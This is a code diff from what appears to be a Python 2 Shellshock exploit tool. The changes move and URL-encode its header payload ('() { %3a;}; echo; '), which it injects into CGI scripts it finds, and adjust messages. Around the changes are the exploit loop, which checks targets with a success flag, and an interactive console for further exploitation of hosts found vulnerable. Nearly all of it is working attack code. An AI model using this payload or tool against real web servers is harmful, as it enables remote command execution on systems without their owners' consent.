@@ -59,6 +59,13 @@ class Unbuffered(object):
 sys.stdout = Unbuffered(sys.stdout)
 
 
+# Dictionary {header:attack string} to try on discovered CGI scripts
+# Where attack string comprises exploit + success_flag + command
+attacks = {
+   "Content-type": "() { %3a;}; echo; "
+   }
+    
+
 # User-agent to use instead of 'Python-urllib/2.6' or similar
 user_agent = "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.0)"
 
@@ -188,21 +195,15 @@ def do_exploit_cgi(proxy, target_list, command, verbose):
         random.choice(string.ascii_uppercase + string.digits
         ) for _ in range(20))
     
-    # Dictionary {header:attack string} to try on discovered CGI scripts
-    # Where attack string comprises exploit + success_flag + command
-    attacks = {
-       "Content-type": "() { :;}; echo; "
-       }
-    
     # A dictionary of apparently successfully exploited targets
     # {url: (header, exploit)}
     # Returned to main() 
     successful_targets = OrderedDict()
 
     if len(target_list) > 1:
-        print "[+] %i potential targets found, attempting exploits" % len(target_list)
+        print "[+] %i potential targets found, attempting exploits..." % len(target_list)
     else:
-        print "[+] 1 potential target found, attempting exploits"
+        print "[+] 1 potential target found, attempting exploit..."
     for target in target_list:
         if verbose: print "[+] Trying exploit for %s" % target 
         if verbose: print "[I] Flag set to: %s" % success_flag
@@ -265,7 +266,10 @@ def ask_for_console(proxy, successful_targets, verbose):
     
     while user_input is not 0:
         result = ""
-        print "[+] The following URLs appear to be exploitable:"
+        if len(ordered_url_list) > 1:
+            print "[+] The following URLs appear to be exploitable:"
+        else:
+            print "[+] The following URL appears to be exploitable:"
         for x in range(len(ordered_url_list)):
             print "  [%i] %s" % (x+1, ordered_url_list[x])
         print "[+] Would you like to exploit further?"
